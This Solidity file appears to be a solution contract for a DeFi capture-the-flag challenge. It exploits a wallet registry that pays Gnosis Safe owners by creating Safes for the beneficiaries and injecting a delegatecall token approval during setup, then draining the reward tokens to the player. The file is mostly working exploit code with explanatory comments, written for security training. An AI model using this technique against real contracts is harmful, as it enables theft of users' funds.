// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { IWalletRegistry } from "./Interfaces/IWalletRegistry.i.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { GnosisSafe } from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import { GnosisSafeProxyFactory } from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import { IProxyCreationCallback } from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract Destroyer {
    address private player;
    address[] private users;
    IWalletRegistry private walletRegistry;
    GnosisSafe private masterCopy;
    GnosisSafeProxyFactory private walletFactory;
    IERC20 private token;

    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    constructor(address _walletRegistry, address[] memory _users, address _player) payable {
        for (uint256 i; i < _users.length; ++i) {
            users.push(_users[i]);
        }
        walletRegistry = IWalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        walletFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // As always, any ether and/or tokens must be transferred back to the
        // player account by the end of this function. Additionally, you may
        // or may not need to create additional functions and/or contracts
        // to solve this challenge.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The solution for this challenge comes from an assumption or oversight
        // made by the WalletRegistry creators: that a Gnosis Safe owner would
        // always be the same person who created the safe. This assumption or
        // oversight meant they did not check or verify the Safe setup() function
        // which configures the Safe by running calls and delegatecalls. In
        // particular, the setup() function calls setupModules() which in turn
        // calls execute() which in turn makes a delegatecall using our provided
        // calldata. The Safe, and the WalletRegistry, assume this functionality
        // will be used safely and sanely by the person creating the Safe because
        // they would want their Safe to be secure. But because we don't want
        // it secure and are looking only to take the rewards from the
        // WalletRegistry, we can abuse these functions for our own purposes.
        // Always question your assumptions!

        // At the start, the WalletRegistry has a list of users who it will pay
        // if they setup a Safe. The way the WalletRegistry checks if they've
        // setup a Safe is using the callback function to check who the Safe
        // owner is when the new Safe is setup. But the WalletRegistry does
        // not check who created the Safe, only the owner. Because of this,
        // we can create a new Safe with one of the beneficiaries as the Safe
        // owner, and then during the setup, call the token contract and
        // give ourselves an approval to spend any tokens in the safe. Because
        // this approval call to the token contract comes from the Safe, we
        // will be able to take the DVT tokens that the WalletRegistry sends
        // to the Safe as a reward.

        // Step 1: create the delegatecall data

        // Just to make things easier, I have set the delegatecall data to
        // call this contract with a delegatecall, and ensured that the function
        // it calls does not interact with storage in any way. It would be better
        // and safer to create a separate contract and call that, but as you have
        // seen in some of my previous solutions, I sometimes take the quick and
        // easy route if it gets the job done!
        bytes memory delegateCallData = abi.encodeWithSignature(
            // Function is created below
            "approveTokenSpend(address,address,uint256)",
            address(this),
            address(token),
            PAYMENT_AMOUNT
        );

        // Step 2: For ever beneficiary, create the setup() data to pass to the
        // Safe creation function, create the safe, and then steal the tokens!
        for (uint256 i; i < users.length; ++i) {
            address[] memory setupUser = new address[](1); // Move outside for loop to save gas
            setupUser[0] = users[i];

            bytes memory setupFuncData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                setupUser, // Safe owner
                EXPECTED_THRESHOLD, // M-of-N multisig threshold if we had more than one owner
                address(this), // delegatecall address
                delegateCallData, // delegatecall data
                //
                //
                // payment handlers and info that would be useful to setup if
                // we were actually going to use the Safe
                address(0),
                address(0),
                0,
                address(0)
            );

            // Technically the safe is a proxy contract that delegatecalls the
            // masterCopy. This saves on gas during creation and also allows
            // the Safe user to know that they are using the official and secure
            // implementation. That's why I named this variable "walletProxy",
            // because it is in fact a proxy contract.
            address walletProxy = address(
                walletFactory.createProxyWithCallback(
                    address(masterCopy), setupFuncData, 0, IProxyCreationCallback(address(walletRegistry))
                )
            );
            // Test that the wallet was successfully created, which also means
            // our malicious delegatecall was successfully run.
            require(walletProxy != address(0));

            // Get the money!
            token.transferFrom(walletProxy, address(this), token.balanceOf(walletProxy));
        }

        // Lastly, send everything to the player address
        token.transfer(player, token.balanceOf(address(this)));
        player.call{ value: address(this).balance }("");

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=iZAPQUF1s4M
    }

    // We use "recipient" instead of address(this) because this function is
    // called as a delegatecall, so address(this) won't actually be this
    // contract's address!
    function approveTokenSpend(address recipient, address dvttoken, uint256 amount) public {
        (bool success,) = dvttoken.call(abi.encodeWithSignature("approve(address,uint256)", recipient, amount));
        require(success);
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
